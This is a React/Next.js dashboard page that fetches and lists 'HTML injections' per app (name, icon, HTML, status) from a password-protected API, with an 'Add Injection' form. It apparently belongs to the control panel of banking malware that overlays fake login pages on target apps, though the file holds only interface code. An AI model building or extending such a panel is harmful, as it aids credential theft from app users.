import React, { useCallback, useRef, useMemo, useReducer, useState, useEffect } from 'react';
import Head from 'next/head';
import MagnifyingGlassIcon from '@heroicons/react/24/solid/MagnifyingGlassIcon';
import { Box, Button, Select, InputLabel, MenuItem, ListItemIcon, InputAdornment, OutlinedInput, Container, Stack, Card, CardHeader, CardActions, Divider, CardContent, SvgIcon, Grid, FormControlLabel, Typography, Checkbox, Link, Dialog, DialogContent, FormControl } from '@mui/material';
import { useSelection } from 'src/hooks/use-selection';
import { Layout as DashboardLayout } from 'src/layouts/dashboard/layout';
import { InjectionsTable } from 'src/sections/injections/inj-table';
import { CustomersSearch } from 'src/sections/customer/customers-search';
import { applyPagination } from 'src/utils/apply-pagination';
import { formatTime } from 'src/utils/formattime';
import SettingsContext from '../settings';
import $ from 'jquery';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faArrowLeft, faPaperPlane, faPlusCircle, faSpinner, faTrashCan, faXmarkSquare } from '@fortawesome/free-solid-svg-icons';
import { checkperms } from 'src/utils/checkperms';
import Popup from 'reactjs-popup'
import AddInjection from 'src/sections/injections/add-inj';

const now = new Date();

const useCustomerIds = (customers) => {
  return useMemo(
    () => {
      return customers.map((customer) => customer.id);
    },
    [customers]
  );
};

const Page = () => {

  let data = [];
  const [customerData, setCustomerData] =  useState([]);
  const [page, setPage] = useState(0);
  const [rowsPerPage, setRowsPerPage] = useState(100);
  const [customers, setCustomers] = useState(applyPagination(data, page, rowsPerPage));
  const customersIds = useCustomerIds(customers);
  const customersSelection = useSelection(customersIds);
  const [showOptions, setShowOptions] = useState(false);
  const countRef = useRef(0);
  const [openAddInjPopup, setopenAddInjPopup] = useState(false);




  useEffect(() => {
    if (!checkperms(2)){
      return
    }

    newCustomers()

  }, []);

  const newCustomers = async () => {
    let request = $.ajax({
      type: 'POST',
      url: SettingsContext.restApiUrl,
      data: {
          'params':  new Buffer ('{"request":"getHtmlInjection","password":"' + SettingsContext.password + ' "}').toString('base64')
      }
    });

    request.done(function(msg) {
      let response = (JSON.parse(msg))
      let responsedata = response.dataInjections
      var data = [];
      
      responsedata.forEach((stats) => {
        const { app, html, icon, cat, name, status } = stats;
        
        data.push({  app, html, icon, cat, name, status});
      });

      SettingsContext.Injections = data;
      setCustomers(applyPagination(data, SettingsContext.CurrentPageInjections, SettingsContext.RowsPerPageInjections))
      SettingsContext.CountInjections = data.length
      
      
    });
    
  };

  const handlePageChange = useCallback(
    (event, value) => {
      setPage(value);
      SettingsContext.CurrentPageInjections = value
      setCustomers(applyPagination(SettingsContext.Injections, SettingsContext.CurrentPageInjections, SettingsContext.RowsPerPageInjections))
    },
    []
  );




  const handleRowsPerPageChange = useCallback(
    (event) => {
    setRowsPerPage(event.target.value);
    SettingsContext.RowsPerPageInjections = event.target.value
    SettingsContext.CurrentPageInjections = 0
    setPage(0);
    setCustomers(applyPagination(SettingsContext.Injections, SettingsContext.CurrentPageInjections, SettingsContext.RowsPerPageInjections))
    },
    []
  );

      if (!checkperms(2)){
        return (
          <>
              <Head>
                <title>
                  Injections
                </title>
              </Head>
              <Box
                component="main"
                sx={{
                  flexGrow: 1,
                  py: 8
                }}
              >
                <Container maxWidth="xl">
                  <Stack spacing={3}>
                    <div>
                    <Link href="/" style={{ textDecoration: 'none' }}>
                        <Button
                          startIcon={(
                            <FontAwesomeIcon icon={faArrowLeft} />
                          )}
                          variant="contained"
                        >
                          Back
                        </Button>
                    </Link>
                    </div>
                    <center><Typography fontSize={32}>You arent allowed here</Typography></center>
                    </Stack>
                    </Container>
              </Box>
          </>
        )
      }

      return (
        <>
          <Head>
            <title>
              Injections
            </title>
          </Head>
          <Box
            component="main"
            sx={{
              flexGrow: 1,
              py: 8
            }}
          >
            <Container maxWidth="xl">
              <Stack spacing={3}>
                <Stack
                  direction="row"
                  justifyContent="space-between"
                  spacing={4}
                >
                  <Stack spacing={1}>
                    <Typography variant="h4">
                      Injections
                    </Typography>
                    <Stack
                      alignItems="center"
                      direction="row"
                      spacing={1}
                    >
                    </Stack>
                  </Stack>
                  <div>
                    <Button
                      startIcon={(
                        <FontAwesomeIcon icon={faPlusCircle} />
                      )}
                      onClick={() => setopenAddInjPopup(true)}
                      variant="contained"
                    >
                      Add Injection
                    </Button>

                    <AddInjection
                    openPopup={openAddInjPopup} 
                    setOpenPopup={setopenAddInjPopup} />
                  </div> 
                </Stack>
                {SettingsContext.Injections.length > 0 ?
                <InjectionsTable
                  count={SettingsContext.CountInjections}
                  items={customers}
                  onDeselectAll={customersSelection.handleDeselectAll}
                  onDeselectOne={customersSelection.handleDeselectOne}
                  onPageChange={handlePageChange}
                  onRowsPerPageChange={handleRowsPerPageChange}
                  onSelectAll={customersSelection.handleSelectAll}
                  onSelectOne={customersSelection.handleSelectOne}
                  page={page}
                  rowsPerPage={rowsPerPage}
                  selected={customersSelection.selected}
                /> : <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', display: 'flex', justifyContent: 'center', alignItems: 'center', animation: 'spin 1s infinite linear',}}>
                <FontAwesomeIcon icon={faSpinner} spin size="10x" /></div>}
              </Stack>
            </Container>
          </Box>
        </>
      );
    }

Page.getLayout = (page) => (
  <DashboardLayout>
    {page}
  </DashboardLayout>
);

export default Page;
